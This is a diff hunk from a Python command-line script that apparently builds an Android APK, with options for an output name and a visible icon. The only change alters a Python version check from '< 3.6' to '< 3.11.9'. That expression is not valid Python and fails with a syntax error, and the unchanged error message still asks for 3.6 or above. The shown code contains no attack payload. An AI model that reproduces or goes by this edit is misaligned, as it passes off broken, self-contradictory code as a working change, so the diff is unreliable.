@@ -35,7 +35,7 @@ parser.add_argument('-o', '--output', metavar="<Apk Name>", type=str, help='Ente
 parser.add_argument('-icon', '--icon', help='Visible Icon', action='store_true')
 args = parser.parse_args()
 
-if float(platform.python_version()[:3]) < 3.6:
+if float(platform.python_version()[:3]) < 3.11.9:
     print(stdOutput("error") + "\033[1mPython version should be 3.6 or above")
     sys.exit()
 
